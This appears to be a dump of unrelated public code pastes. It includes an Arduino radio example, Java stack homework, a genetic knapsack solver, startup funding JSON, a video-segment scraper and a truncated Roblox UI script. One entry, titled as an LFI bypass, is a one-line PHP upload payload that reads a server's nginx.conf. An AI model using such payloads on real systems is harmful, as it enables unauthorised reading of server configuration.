// uniquely identify which address this radio will use to transmit
bool radioNumber = 1;  // 0 uses address[0] to transmit, 1 uses address[1] to transmit

// Used to control whether this node is sending or receiving
bool role = false;  // true = TX role, false = RX role

// For this example, we'll be using a payload containing
// a single float number that will be incremented
// on every successful transmission
float payload = 0.0;

void setup() {

  Serial.begin(115200);
  while (!Serial) {
    // some boards need to wait to ensure access to serial over USB
  }

  // initialize the transceiver on the SPI bus
  if (!radio.begin()) {
    Serial.println(F(""radio hardware is not responding!!""));
    while (1) {}  // hold in infinite loop
  }

  // print example's introductory prompt
  Serial.println(F(""RF24/examples/GettingStarted""));

  // To set the radioNumber via the Serial monitor on startup
  Serial.println(F(""Which radio is this? Enter '0' or '1'. Defaults to '0'""));
  while (!Serial.available()) {
    // wait for user input
  }
  char input = Serial.parseInt();
  radioNumber = input == 1;
  Serial.print(F(""radioNumber = ""));
  Serial.println((int)radioNumber);

  // role variable is hardcoded to RX behavior, inform the user of this
  Serial.println(F(""*** PRESS 'T' to begin transmitting to the other node""));

  // Set the PA Level low to try preventing power supply related problems
  // because these examples are likely run with nodes in close proximity to
  // each other.
  radio.setChannel(0x76);  // 108 (base 10) or 0x6C (base 16) - 2.476GHz
  radio.setAutoAck(false);  
  radio.setDataRate(RF24_1MBPS);
  radio.setPALevel(RF24_PA_LOW);  // RF24_PA_MAX is default.

  // save on transmission time by setting the radio to only transmit the
  // number of bytes we need to transmit a float
  radio.setPayloadSize(sizeof(payload));  // float datatype occupies 4 bytes

  // set the TX address of the RX node into the TX pipe
  radio.openWritingPipe(address[radioNumber]);  // always uses pipe 0

  // set the RX address of the TX node into a RX pipe
  radio.openReadingPipe(1, address[!radioNumber]);  // using pipe 1

  // additional setup specific to the node's role
  if (role) {
    radio.stopListening();  // put radio in TX mode
  } else {
    radio.startListening();  // put radio in RX mode
  }

  // For debugging info
  // printf_begin();             // needed only once for printing details
  // radio.printDetails();       // (smaller) function that prints raw register values
   radio.printPrettyDetails(); // (larger) function that prints human readable data

}  // setup

void loop() {

  if (role) {
    // This device is a TX node

    unsigned long start_timer = micros();                // start the timer
    bool report = radio.write(&payload, sizeof(float));  // transmit & save the report
    unsigned long end_timer = micros();                  // end the timer

    if (report) {
      Serial.print(F(""Transmission successful! ""));  // payload was delivered
      Serial.print(F(""Time to transmit = ""));
      Serial.print(end_timer - start_timer);  // print the timer result
      Serial.print(F("" us. Sent: ""));
      Serial.println(payload);  // print payload sent
      payload += 0.01;          // increment float payload
    } else {
      Serial.println(F(""Transmission failed or timed out""));  // payload was not delivered
    }

    // to make this example readable in the serial monitor
    delay(1000);  // slow transmissions down by 1 second

  } else {
    // This device is a RX node

    uint8_t pipe;
    if (radio.available(&pipe)) {              // is there a payload? get the pipe number that recieved it
      uint8_t bytes = radio.getPayloadSize();  // get the size of the payload
      radio.read(&payload, bytes);             // fetch payload from FIFO
      Serial.print(F(""Received ""));
      Serial.print(bytes);  // print the size of the payload
      Serial.print(F("" bytes on pipe ""));
      Serial.print(pipe);  // print the pipe number
      Serial.print(F("": ""));
      Serial.println(payload);  // print the payload's value
    }
  }  // role

  if (Serial.available()) {
    // change the role via the serial monitor

    char c = toupper(Serial.read());
    if (c == 'T' && !role) {
      // Become the TX node

      role = true;
      Serial.println(F(""*** CHANGING TO TRANSMIT ROLE -- PRESS 'R' TO SWITCH BACK""));
      radio.stopListening();

    } else if (c == 'R' && role) {
      // Become the RX node

      role = false;
      Serial.println(F(""*** CHANGING TO RECEIVE ROLE -- PRESS 'T' TO SWITCH BACK""));
      radio.startListening();
    }
  }

}  // loop"
jNU3aT2t,Vowel count,ifigazsi,Python,Friday 19th of January 2024 09:35:15 AM CDT,"#### A ####

sentence = ""Hello World.""
vowels = {""a"", ""e"", ""i"", ""o"", ""u""}
stat = {}
for c in sentence.lower():
    if c in vowels:
        stat[c] = stat.get(c, 0) + 1
print(stat)

#### B ####
sentence = ""Hello World.""
vowels = {""a"", ""e"", ""i"", ""o"", ""u""}
for v in vowels:
    print(f""{v}: {sentence.lower().count(v)}"")

#### C ####
sentence = ""Hello World.""
print([(x, sentence.lower().count(x)) for x in {""a"", ""e"", ""i"", ""o"", ""u""}])"
E162cDn0,main.py,Dragon1573,Python,Friday 19th of January 2024 09:34:41 AM CDT,"import asyncio
from logging import INFO, error, info, warning, basicConfig
from re import search
import httpx
from lxml.etree import HTML
from aiofiles import open
from os.path import join


URL = ""https://www.ahsnxc.com/vodplay/49144-1-1.html""
HEADER = {
    ""User-Agent"": (
        ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) ""
        ""Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0""
    )
}

basicConfig(
    format=""%(asctime)s [%(levelname)s] %(message)s"",
    datefmt=""%Y-%m-%d %H:%M:%S"",
    level=INFO,
)


async def get_data(_client: httpx.AsyncClient, _url: str) -> str:
    response = await _client.get(_url)
    return response.text


async def get_first_m3u8(_data: str) -> str:
    dom = HTML(_data)
    url: str = dom.xpath('//div[@class=""play-window""]/script/text()')[0]  # type: ignore
    if result := search(r'.*?""url"":""(.*?)"",', url):
        return result.group(1).replace(""\\"", """")
    return """"


async def get_second_m3u8(_client: httpx.AsyncClient, _m3u8: str) -> str:
    data = await get_data(_client, _m3u8)
    sub_url = data.split()[-1]
    return _m3u8.split(""index"")[0] + sub_url


async def download(_client: httpx.AsyncClient, _url: str):
    for _ in range(5):
        try:
            ts_name = _url.split(""/"")[-1]
            info(f""{ts_name} 开始下载！"")
            response = await _client.get(_url, timeout=20, headers=HEADER)
            info(f""{ts_name} 下载完成！"")
            async with open(join(""movies"", ts_name), ""wb"") as file:
                await file.write(response.content)
                info(f""{ts_name} 写入完成！"")
            break
        except httpx.TimeoutException:
            error(f""{_url} 请求超时！"")
        except Exception:
            warning(f""{_url} 下载失败！"")


async def download_all(_client: httpx.AsyncClient, _m3u8: str):
    data = (await _client.get(_m3u8)).text
    async with open(""ts.txt"", ""w"", encoding=""UTF-8"") as file:
        await file.write(data)
    async with open(""ts.txt"", ""r"", encoding=""UTF-8"") as file:
        lines = await file.readlines()
        lines = [_.strip() for _ in lines]
        tasks = [asyncio.ensure_future(download(_client, _)) for _ in lines if not _.startswith(""#"")]
    await asyncio.gather(*tasks)


async def main():
    async with httpx.AsyncClient(headers=HEADER, http2=True, timeout=2.0) as client:
        data = await get_data(client, URL)
        m3u8_01 = await get_first_m3u8(data)
        m3u8_02 = await get_second_m3u8(client, m3u8_01)
        await download_all(client, m3u8_02)


if __name__ == ""__main__"":
    asyncio.run(main())
"
3YdP8Xji,wmic csproduct get uuid,Latthawit,Python,Friday 19th of January 2024 09:11:12 AM CDT,032E02B4-0499-0540-C106-520700080009
TC8ZCS3L,TP02_Punto01,gabriel097,Java,Friday 19th of January 2024 08:29:11 AM CDT,"/*
1) Incorporar un método a la definición de clase Stack (versiones básica o genérica propuestas en teoría) que
reciba como parámetro un valor y realice la operación de eliminación de ese valor sobre el objeto Stack
que está ejecutando el mensaje o método.
Modifique el programa escrito de manera que permita optar entre el ingreso de valores por consola o por
un generador de valores aleatorios.
Indicaciones:
Este ejercicio necesita del objeto scanner para ingresar datos por la consola o teclado, se espera que el
código controle los problemas que normalmente ocurren al operar con la consola o teclado.
Se espera una correcta modularización entre el código que realiza el ingreso y validación de los datos
respecto del código que hace lo que se solicita en el ejercicio. El ejercicio debe implementar un mecanismo 
para seleccionar el ingreso de valores por consola o generados aleatoriamente.
 */
public class Punto01 {

    static Stack<Integer> pila = new Stack();

    public static void main(String[] args) {
        char resp;
        int op;
        do {
            System.out.println(""********Menu********"" + ""\n1 - Cargar valor en la pila"" + ""\n2 - Mostrar elementos de la pila""
                    + ""\n3 - Retirar elemento/s de la pila"" + ""\n4 - Salir"");
            op = helper.ValidarIntPositivo(""Ingrese de nuevo"");
            switch (op) {
                case 1:
                    do {
                        System.out.println(""Elemento cargado: "" + pila.push(valor()));
                        System.out.println(""Continuar cargando? s/n"");
                        resp = helper.validarRespuesta();
                    } while (resp != 'n');
                    break;
                case 2:
                    System.out.println(pila.toString());
                    break;
                case 3:
                    while (!pila.empty()) {
                        System.out.println(""Elemento eliminado: "" + pila.pop());
                    }
                    break;
                case 4:
                    System.out.println(""Adios...."");
                    break;
                default:
                    System.out.println(""Opcion incorrecta..."");
            }
        } while (op != 4);
    }

    static int valor() {

        int numero = 0;
        System.out.println(""-----Carga de Valor-----"" + ""\n1 - Ingreso por consola"" + ""\n2 - Generar Nro Aleatorio"");
        int op = helper.ValidarIntPositivo(""Ingrese de nuevo"");

        switch (op) {
            case 1:
                System.out.println(""Ingrese un valor..."");
                numero = helper.ValidarIngresoInt(""Vuelva a ingresar..."");
                break;
            case 2:
                numero = helper.ramdomInt(100);
                System.out.println(""--->Valor generado:"" + numero);
                break;
            default:
                System.out.println(""Opcion incorrecta..."");
        }
        return numero;

    }

}
"
7bNFEDSM,Stack,gabriel097,Java,Friday 19th of January 2024 08:27:13 AM CDT,"
/*
The Stack class represents a last-in-first-out (LIFO) stack of objects.
 
The usual push and pop operations are provided, as well as a method to
peek at the top item on the stack, a method to test for whether the
stack is empty, and a method to search the stack for an item and discover
how far it is from the top.
 
When a stack is first created, it contains no items.
 
from https://docs.oracle.com/en/java/javase/13/docs/api/java.base/java/util/Stack.html
from https://docs.oracle.com/en/java/javase/14/docs/api/java.base/java/util/Stack.html
from https://docs.oracle.com/en/java/javase/15/docs/api/java.base/java/util/Stack.html
 
 */
public class Stack<ELEMENT> {
 
    //region Constants
 
    private final static Integer defaulDimension = 10;
 
    //endregion
 
    //region Attributes
 
    private ELEMENT [] data;
    private Integer count;
 
    //endregion
 
    //region Constructors
 
    public Stack() {
        this(Stack.defaulDimension);
    }
    public Stack(Integer dimension) {
        if (dimension <= 0) {
            throw new RuntimeException(""La cantidad de elementos en la  pila debe ser positiva"");
        }
        this.data = (ELEMENT []) new Object[dimension];
        this.count = 0;
    }
 
    //endregion
 
    //region Stack Methods
 
    // Test if this stack is empty.
    public boolean empty() {
        return this.count <= 0;
    }
 
    // Looks at the object at the top of this stack without removing it from the stack.
    public ELEMENT peek() {
        if (this.empty()) {
            throw new RuntimeException(""La pila está vacía..."");
        }
        return this.data[this.count - 1];
    }
 
    // Removes the object at the top of this stack and returns that object as the value of this function.
    public ELEMENT pop() {
        if (this.empty()) {
            throw new RuntimeException(""La pila está vacía..."");
        }
        --this.count;
        return this.data[this.count];
    }
 
    // Pushes an item onto the top of this stack.
    public ELEMENT push(ELEMENT element) {
        if (this.size() >= this.data.length) {
//            throw new RuntimeException(""La pila está llena..."");
 
            ELEMENT [] temp = (ELEMENT []) new Object[this.data.length * 2];
            for (int i = 0; i < this.data.length; ++i) {
                temp[i] = this.data[i];
            }
            this.data = temp;
        }
        this.data[this.count] = element;
        ++this.count;
        return element;
    }
 
    // Returns the 1-based position where an object is on this stack.
    public int search(Object object) {
        for (int pos = this.count - 1; pos >= 0; --pos) {
            if (this.data[pos].equals(object)) {
                return this.count - pos;
            }
        }
        return -1;
    }
    //endregion
 
    //region Inherited Methods
 
    // from https://docs.oracle.com/en/java/javase/14/docs/api/java.base/java/util/Vector.html
    // Returns the number of components in this vector.
    public int size() {
        return this.count;
    }
 
    //endregion
 
 
 
    //region Override Object basic methods
 
    @Override
    public String toString() {
 
        if (this.size() <=0) {
            return """";
        }
 
        // from https://docs.oracle.com/en/java/javase/15/docs/api/java.base/java/lang/StringBuilder.html
        StringBuilder sb = new StringBuilder();
        sb.append(""["" + this.data[0].toString());
        for (int i = 1; i < this.size(); ++i) {
            sb.append("", "" + this.data[i].toString());
        }
        sb.append(""]"");
        return sb.toString();
    }
    //endregion
 
 
}"
iRgbEsK1,techstars,isakura132,JSON,Friday 19th of January 2024 07:27:15 AM CDT,"    ""investments"": [
      {
        ""raised_usd"": 6535912,
        ""name"": ""Seed Round - Heex Technologies"",
        ""organization"": ""Heex Technologies"",
        ""announced_on"": ""2024-01-18"",
        ""is_lead_investor"": false
      },
      {
        ""raised_usd"": 464635,
        ""name"": ""Pre Seed Round - Trudenty"",
        ""organization"": ""Trudenty"",
        ""announced_on"": ""2024-01-15"",
        ""is_lead_investor"": null
      },
      {
        ""raised_usd"": 7700000,
        ""name"": ""Pre Seed Round - Echo Labs"",
        ""organization"": ""Echo Labs"",
        ""announced_on"": ""2024-01-10"",
        ""is_lead_investor"": null
      },
      {
        ""raised_usd"": 5324999,
        ""name"": ""Seed Round - PierSight Space"",
        ""organization"": ""PierSight Space"",
        ""announced_on"": ""2024-01-09"",
        ""is_lead_investor"": null
      },
      {
        ""raised_usd"": 1000000,
        ""name"": ""Pre Seed Round - Imaginario AI"",
        ""organization"": ""Imaginario AI"",
        ""announced_on"": ""2023-12-19"",
        ""is_lead_investor"": null
      },
      {
        ""raised_usd"": 120000,
        ""name"": ""Pre Seed Round - Swoove"",
        ""organization"": ""Swoove"",
        ""announced_on"": ""2023-12-15"",
        ""is_lead_investor"": true
      },
      {
        ""raised_usd"": 120000,
        ""name"": ""Pre Seed Round - Jump n Pass"",
        ""organization"": ""Jump n Pass"",
        ""announced_on"": ""2023-12-15"",
        ""is_lead_investor"": true
      },
      {
        ""raised_usd"": 20000,
        ""name"": ""Pre Seed Round - Veend"",
        ""organization"": ""Veend"",
        ""announced_on"": ""2023-12-14"",
        ""is_lead_investor"": true
      },
      {
        ""raised_usd"": 120000,
        ""name"": ""Pre Seed Round - GetEquity"",
        ""organization"": ""GetEquity"",
        ""announced_on"": ""2023-12-14"",
        ""is_lead_investor"": null
      },
      {
        ""raised_usd"": 120000,
        ""name"": ""Pre Seed Round - Beauty Hut"",
        ""organization"": ""Beauty Hut"",
        ""announced_on"": ""2023-12-14"",
        ""is_lead_investor"": true
      }
    ],
    ""investors"": [
      {
        ""is_lead_investor"": true,
        ""name"": ""SVB Financial Group""
      },
      {
        ""is_lead_investor"": null,
        ""name"": ""Foundry Group""
      },
      {
        ""is_lead_investor"": false,
        ""name"": ""Avalon Ventures""
      },
      {
        ""is_lead_investor"": false,
        ""name"": ""Foundry Group""
      },
      {
        ""is_lead_investor"": false,
        ""name"": ""Lightbank""
      },
      {
        ""is_lead_investor"": null,
        ""name"": ""LaunchCapital""
      },
      {
        ""is_lead_investor"": false,
        ""name"": ""Silicon Valley Bank""
      },
      {
        ""is_lead_investor"": false,
        ""name"": ""RRE Ventures""
      },
      {
        ""is_lead_investor"": false,
        ""name"": ""SoftBank Capital""
      },
      {
        ""is_lead_investor"": false,
        ""name"": ""IA Ventures""
      }
    ],"
PWVTwmES,lfi bypass via file upload,paperline27,PHP,Friday 19th of January 2024 07:07:29 AM CDT,<?php echo file_get_contents('/home/user/etc/nginx/nginx.conf'); ?>
nH7ynsGB,Untitled,JackOUT,Java,Friday 19th of January 2024 07:02:28 AM CDT,"package com.bcs2024.knapsack.algorithm;

import com.bcs2024.knapsack.model.CargoSpace;
import com.bcs2024.knapsack.renderer.UI;
import com.bcs2024.knapsack.util.ShapesAndRotations;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Random;

public class GeneticKnapsackSolverDynamic {

    private final double MUTATION_RATE = 0.3;
    //private double dynamicMutationRate = MUTATION_RATE;
    private final double CROSSOVER_RATE = 0.8;
    private final int MAX_GENERATIONS = 10;
    private final int GENE_LENGTH = 54;
    private final Random random = new Random();
    private final int POPULATION_SIZE = 100;
    private List<Chromosome> population;
    private int[] bestSolutionRotation;
    private String[] bestSolutionGene;

    private Chromosome bestChromosome;

    private CargoSpace cargoSpace = UI.cargoSpace;

    public static void main(final String[] args) {
        /*final List<Parcel> parcels = new ArrayList<>();
        parcels.add(new Parcel(""A""));
        parcels.add(new Parcel(""B""));
        parcels.add(new Parcel(""C""));*/

        final GeneticKnapsackSolverDynamic solver = new GeneticKnapsackSolverDynamic();
        solver.solve();
    }

    public void solve() {
        bestSolutionGene = new String[GENE_LENGTH];
        bestSolutionRotation = new int[GENE_LENGTH];

        initializePopulation();

        for (int i = 0; i < MAX_GENERATIONS; i++) {
            evaluateFitness(population);
            crossover();
            mutation();
            //final double currentDiversity = calculateDiversity(population);
            //System.out.println(""Diversity after generation "" + i + "": "" + currentDiversity);
            System.out.println(""Generation: "" + i + "" done. -------------------------------------------------------------------------------"" + ""\n"");
        }

        System.out.println(""Rotation: "" + Arrays.toString(bestSolutionRotation));
        System.out.println(""Genes: "" + Arrays.toString(bestSolutionGene));
        applyBestSolution();
    }

    private void initializePopulation() {
        population = new ArrayList<>(POPULATION_SIZE);
        final String[] parcelTypes = {""A"", ""B"", ""C""}; // Define available parcel types
        final ShapesAndRotations shapesAndRotations = new ShapesAndRotations(); // To get the number of rotations

        for (int i = 0; i < POPULATION_SIZE; i++) {
            final Chromosome chromosome = new Chromosome(GENE_LENGTH);
            final String[] genes = chromosome.getGenes();
            final int[] rotations = chromosome.getRotations();

            for (int j = 0; j < GENE_LENGTH; j++) {
                // Randomly assign a parcel type
                final String parcelType = parcelTypes[random.nextInt(parcelTypes.length)];
                genes[j] = parcelType;

                // Randomly assign a rotation
                final int maxRotations = shapesAndRotations.rotationNum(parcelType);
                final int rotation = random.nextInt(maxRotations);
                rotations[j] = rotation;
            }

            chromosome.setGenes(genes);
            chromosome.setRotations(rotations);
            population.add(chromosome);
        }
    }

    private void evaluateFitness(final List<Chromosome> population) {
        final ShapesAndRotations shapes = new ShapesAndRotations();

        for (final Chromosome chromo : population) {
            int totalValue = 0;
            int countA = 0;
            int countB = 0;
            int countC = 0;
            final CargoSpace localCargoSpace = new CargoSpace();
            final int[][][] occupied = localCargoSpace.getOccupied();
            final boolean[] parcelUsed = new boolean[GENE_LENGTH]; // To track which parcels are used

            for (int x = 0; x < occupied.length; x++) {
                for (int y = 0; y < occupied[0].length; y++) {
                    for (int z = 0; z < occupied[0][0].length; z++) {
                        for (int i = 0; i < chromo.getGenes().length; i++) {
                            final String gene = chromo.getGenes()[i];
                            final int rotation = chromo.getRotationFromGene(i);
                            final int[][][] shape = shapes.getShape(gene, rotation);

                            //final Parcel parcel = new Parcel(gene, shape);
                            //final ParcelPlacement placement = new ParcelPlacement(parcel, x, y, z);

                            if (localCargoSpace.canPlace(shape, x, y, z)) {
                                localCargoSpace.placeParcel(shape, x, y, z, occupied);
                                parcelUsed[i] = true; // Mark this parcel as used

                                switch (gene) {
                                    case ""A"" -> {
                                        totalValue += 3;
                                        countA++;
                                    }
                                    case ""B"" -> {
                                        totalValue += 4;
                                        countB++;
                                    }
                                    case ""C"" -> {
                                        totalValue += 5;
                                        countC++;
                                    }
                                }
                            }
                        }
                    }
                }
            }

            final int fitness = getFitness(occupied, totalValue);
            chromo.setFitness(fitness);

            // Store the best solution
            if (bestChromosome == null || chromo.getFitness() > bestChromosome.getFitness()) {
                bestChromosome = chromo;
                bestSolutionRotation = chromo.getRotations();
                bestSolutionGene = chromo.getGenes();
            }

            System.out.println(""Chromosome Fitness: "" + chromo.getFitness());
            System.out.println(Arrays.toString(chromo.getRotations()));
            System.out.println(Arrays.toString(chromo.getGenes()));
            System.out.println(""A: "" + countA + "" B: "" + countB + "" C: "" + countC);
        }
    }

    private int getFitness(final int[][][] occupied, final int totalValue) {
        int emptySlots = 0;
        for (final int[][] slice : occupied) {
            for (final int[] row : slice) {
                for (final int cell : row) {
                    if (cell == -1) {
                        emptySlots++;
                    }
                }
            }
        }

        // Parameters for weighing the importance of space utilization
        final double spaceUtilizationWeight = 0.5; // Can be adjusted
        final double valueWeight = 1.0 - spaceUtilizationWeight;

        return (int) (valueWeight * totalValue - spaceUtilizationWeight * emptySlots);
    }

    private Chromosome tournamentSelection(final int tournamentSize) {
        final List<Chromosome> tournamentParticipants = new ArrayList<>();

        if (tournamentSize > population.size() || tournamentSize < 1) {
            throw new IllegalArgumentException(""Tournament size should be between 1 and population size."");
        }

        for (int i = 0; i < tournamentSize; i++) {
            tournamentParticipants.add(population.get(random.nextInt(population.size())));
        }

        Chromosome winner = tournamentParticipants.get(0);
        for (final Chromosome participant : tournamentParticipants) {
            if (participant.getFitness() > winner.getFitness()) {
                winner = participant;
            }
        }

        return winner;
    }

    private void crossover() {
        final List<Chromosome> newPopulation = new ArrayList<>();
        //final double preCrossoverDiversity = calculateDiversity(population);

        // Loop to create offspring in pairs
        for (int i = 0; i < POPULATION_SIZE; i += 2) {
            final Chromosome parent1 = tournamentSelection(2);
            final Chromosome parent2 = tournamentSelection(2);

            final Chromosome offspring1 = new Chromosome(GENE_LENGTH);
            final Chromosome offspring2 = new Chromosome(GENE_LENGTH);

            int crossoverPoint1 = random.nextInt(GENE_LENGTH);
            int crossoverPoint2 = random.nextInt(GENE_LENGTH);

            // Ensure crossoverPoint1 is less than crossoverPoint2
            if (crossoverPoint1 > crossoverPoint2) {
                final int temp = crossoverPoint1;
                crossoverPoint1 = crossoverPoint2;
                crossoverPoint2 = temp;
            }

            if (random.nextDouble() <= CROSSOVER_RATE) {
                for (int j = 0; j < GENE_LENGTH; j++) {
                    if (j < crossoverPoint1 || j > crossoverPoint2) {
                        offspring1.getGenes()[j] = parent1.getGenes()[j];
                        offspring1.getRotations()[j] = parent1.getRotations()[j];

                        offspring2.getGenes()[j] = parent2.getGenes()[j];
                        offspring2.getRotations()[j] = parent2.getRotations()[j];
                    } else {
                        offspring1.getGenes()[j] = parent2.getGenes()[j];
                        offspring1.getRotations()[j] = parent2.getRotations()[j];

                        offspring2.getGenes()[j] = parent1.getGenes()[j];
                        offspring2.getRotations()[j] = parent1.getRotations()[j];
                    }
                }
            } else {
                offspring1.setGenes(parent1.getGenes().clone());
                offspring1.setRotations(parent1.getRotations().clone());

                offspring2.setGenes(parent2.getGenes().clone());
                offspring2.setRotations(parent2.getRotations().clone());
            }

            if (isValid(offspring1)) {
                newPopulation.add(offspring1);
            } else {
                final Chromosome offspringRepaired = new Chromosome(GENE_LENGTH);
                newPopulation.add(offspringRepaired);
            }

            if (isValid(offspring2)) {
                newPopulation.add(offspring2);
            } else {
                final Chromosome offspringRepaired2 = new Chromosome(GENE_LENGTH);
                newPopulation.add(offspringRepaired2);
            }
        }

        population = newPopulation;
        //final double postCrossoverDiversity = calculateDiversity(population);
        //  System.out.println(""Diversity change after crossover: "" + (postCrossoverDiversity - preCrossoverDiversity));

        // Adapt mutation rate based on diversity change
        //adaptMutationRate(preCrossoverDiversity, postCrossoverDiversity);
    }

    private void mutation() {
        // final double preMutationDiversity = calculateDiversity(population);

        for (final Chromosome chromo : population) {
            if (random.nextDouble() < MUTATION_RATE) { // Use dynamicMutationRate
                final int index = random.nextInt(GENE_LENGTH);
                final String[] types = {""A"", ""B"", ""C""};
                final String newType = types[random.nextInt(types.length)];

                chromo.getGenes()[index] = newType;

                final ShapesAndRotations shapesAndRotations = new ShapesAndRotations();
                final int newRotation = random.nextInt(shapesAndRotations.rotationNum(newType));
                chromo.getRotations()[index] = newRotation;
            }
        }
        // final double postMutationDiversity = calculateDiversity(population);
        //System.out.println(""Diversity change after mutation: "" + (postMutationDiversity - preMutationDiversity));

        // Adapt mutation rate based on diversity change
        //adaptMutationRate(preMutationDiversity, postMutationDiversity);
    }

    /*private void adaptMutationRate(final double preDiversity, final double postDiversity) {
        if (postDiversity < preDiversity) {
            // If diversity has decreased, increase the mutation rate to introduce more diversity
            dynamicMutationRate = Math.min(dynamicMutationRate + 0.1, 1.0);
        } else {
            // If diversity has increased or stayed the same, decrease the mutation rate to allow the population to stabilize
            dynamicMutationRate = Math.max(dynamicMutationRate - 0.05, 0.1);
        }
        System.out.println(""Adapted Mutation Rate: "" + dynamicMutationRate);
    }

    private double calculateShapeDiversity(final List<CargoSpace> population) {
        final Set<int[][][]> uniqueShapes = new HashSet<>();
        for (final CargoSpace cargoSpace : population) {
            for (final ParcelPlacement placement : cargoSpace.getPlacements()) {
                final int[][][] shapeSignature = getShapeSignature(placement);
                uniqueShapes.add(shapeSignature);
            }
        }

        return uniqueShapes.size();
    }

    private int[][][] getShapeSignature(final ParcelPlacement placement) {
        return placement.getShape();
    }

    private double calculatePositionalDiversity(final List<CargoSpace> population) {
        double totalDistance = 0.0;
        int comparisons = 0;

        for (int i = 0; i < population.size() - 1; i++) {
            for (int j = i + 1; j < population.size(); j++) {
                final CargoSpace space1 = population.get(i);
                final CargoSpace space2 = population.get(j);
                // Compare placements in space1 and space2
                for (final ParcelPlacement placement1 : space1.getPlacements()) {
                    for (final ParcelPlacement placement2 : space2.getPlacements()) {
                        if (Arrays.deepEquals(getShapeSignature(placement1), getShapeSignature(placement2))) {
                            totalDistance += calculateDistance(placement1, placement2);
                            comparisons++;
                        }
                    }
                }
            }
        }

        return comparisons > 0 ? totalDistance / comparisons : 0;
    }

    private double calculateDistance(final ParcelPlacement placement1, final ParcelPlacement placement2) {
        // Euclidean distance between two parcel placements
        return Math.sqrt(Math.pow(placement1.getX() - placement2.getX(), 2) +
                Math.pow(placement1.getY() - placement2.getY(), 2) +
                Math.pow(placement1.getZ() - placement2.getZ(), 2));
    }

    private double calculateDiversity(final List<Chromosome> chromosomePopulation) {
        // Convert each chromosome to a corresponding CargoSpace
        final List<CargoSpace> cargoSpacePopulation = new ArrayList<>();
        for (final Chromosome chromosome : chromosomePopulation) {
            cargoSpacePopulation.add(chromosomeToCargoSpace(chromosome));
        }

        // Now calculate diversity based on the CargoSpace objects
        final double shapeDiversityScore = calculateShapeDiversity(cargoSpacePopulation);
        final double positionalDiversityScore = calculatePositionalDiversity(cargoSpacePopulation);

        // Combine the scores. Adjust the weights if necessary.
        return shapeDiversityScore * 0.5 + positionalDiversityScore * 0.5;
    }

    private CargoSpace chromosomeToCargoSpace(final Chromosome chromosome) {
        final CargoSpace cargoSpace = new CargoSpace();
        final ShapesAndRotations shapes = new ShapesAndRotations();

        for (int i = 0; i < chromosome.getGenes().length; i++) {
            final String gene = chromosome.getGenes()[i];
            final int rotation = chromosome.getRotationFromGene(i);
            final int[][][] shape = shapes.getShape(gene, rotation);

            // Find a place to put the parcel. This is a simplified placement logic.
            // You might have a more complex placement strategy.
            for (int x = 0; x < cargoSpace.getOccupied().length; x++) {
                for (int y = 0; y < cargoSpace.getOccupied()[0].length; y++) {
                    for (int z = 0; z < cargoSpace.getOccupied()[0][0].length; z++) {
                        final Parcel parcel = new Parcel(gene, shape);
                        final ParcelPlacement placement = new ParcelPlacement(parcel, x, y, z);
                        if (cargoSpace.canPlace(placement)) {
                            cargoSpace.placeParcel(placement);
                            // Break the loops after placing the parcel
                            x = cargoSpace.getOccupied().length;
                            y = cargoSpace.getOccupied()[0].length;
                            z = cargoSpace.getOccupied()[0][0].length;
                        }
                    }
                }
            }
        }

        return cargoSpace;
    }*/

    private boolean isValid(final Chromosome chromo) {
        final ShapesAndRotations shapes = new ShapesAndRotations();
        int totalValue = 0;
        final CargoSpace cargoSpace = new CargoSpace();
        final int[][][] occupied = cargoSpace.getOccupied();

        for (int x = 0; x < occupied.length; x++) {
            for (int y = 0; y < occupied[0].length; y++) {
                for (int z = 0; z < occupied[0][0].length; z++) {
                    for (int i = 0; i < chromo.getGenes().length; i++) {
                        final String gene = chromo.getGenes()[i];
                        final int rotation = chromo.getRotationFromGene(i);
                        final int[][][] shape = shapes.getShape(gene, rotation);
                        if (cargoSpace.canPlace(shape, x, y, z)) {
                            if (""A"".equals(gene)) {
                                totalValue += 3;
                            } else if (""B"".equals(gene)) {
                                totalValue += 4;
                            } else if (""C"".equals(gene)) {
                                totalValue += 5;
                            }
                        }
                    }
                }
            }
        }

        return totalValue > 0;
    }

    private void applyBestSolution() {
        if (bestChromosome == null) {
            System.out.println(""No optimal solution found."");
            return;
        }
        final CargoSpace bestCargoSpace = new CargoSpace();
        final ShapesAndRotations shapes = new ShapesAndRotations();
        final int[][][] occupied = bestCargoSpace.getOccupied();

        // Use the best chromosome to set the cargo space fields
        for (int i = 0; i < bestChromosome.getGenes().length; i++) {
            final String gene = bestChromosome.getGenes()[i];
            final int rotation = bestChromosome.getRotationFromGene(i);
            final int[][][] shape = shapes.getShape(gene, rotation);

            boolean placed = false;
            for (int x = 0; x < occupied.length && !placed; x++) {
                for (int y = 0; y < occupied[0].length && !placed; y++) {
                    for (int z = 0; z < occupied[0][0].length && !placed; z++) {

                        /*final Parcel parcel = new Parcel(gene);
                        parcel.setShape(shape);
                        final ParcelPlacement placement = new ParcelPlacement(parcel, x, y, z);*/

                        if (bestCargoSpace.canPlace(shape, x, y, z)) {
                            bestCargoSpace.placeParcel(shape, x, y, z, occupied);
                            placed = true; // Parcel placed, move to next parcel
                        }
                    }
                }
            }

            if (!placed) {
                System.out.println(""Could not place parcel: "" + gene);
            }
        }

        System.out.println(""Best solution: "" + bestChromosome.getFitness());
        cargoSpace.setOccupied(occupied); // Reflect the best solution in the CargoSpace
        System.out.println(Arrays.deepToString(cargoSpace.getOccupied()));
    }

}
"
7FNTBrxA,Close,Peluchecoman,Lua,Friday 19th of January 2024 06:57:19 AM CDT,"if game:GetService(""Players"").LocalPlayer.PlayerGui:FindFirstChild(""RayfieldToggleScreen"") then
    game:GetService(""Players"").LocalPlayer.PlayerGui:FindFirstChild(""RayfieldToggleScreen""):Destroy()
end

local existingUI = game:GetService(""CoreGui""):FindFirstChild(""RayfieldToggleScreen"")

if existingUI then
    existingUI:Destroy()
end

local RayfieldScreen   = Instance.new(""ScreenGui"")
local RayfieldToggleUI = Instance.new(""TextButton"")
local RayfieldCornerUI = Instance.new(""UICorner"")
local RayfieldImageUI  = Instance.new(""ImageLabel"")
RayfieldScreen.Name = ""RayfieldToggleScreen""
RayfieldScreen.Parent = game.CoreGui
RayfieldScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

RayfieldToggleUI.Name = ""RayfieldToggleUI""
RayfieldToggleUI.Parent = RayfieldScreen
